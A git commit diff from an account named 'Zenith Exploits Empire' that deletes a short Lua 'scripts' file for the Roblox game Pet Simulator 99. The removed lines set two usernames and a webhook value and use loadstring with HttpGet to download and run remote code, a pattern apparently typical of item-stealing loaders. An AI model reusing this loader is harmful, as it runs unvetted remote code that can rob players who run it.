d2d4a1f46965c5d9d32ceef56eb2db7029156fde
Zenith Exploits Empire <arshansiddiqui.msvd@gmail.com>
2025-04-22 15:50:40 +0200

    Delete ps99/Petsimulator99scripts.lua

--- ps99/Petsimulator99scripts.lua
+++
@@ -1,5 +0,0 @@
-Username = "rfgjkgc"
-Username2 = "Kherkher10"
-Webhook = "26513227165263"
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Zenith-Exploits-Empire/Final/refs/heads/main/RAW%20-%20Pet%20Simulator%2099"))()
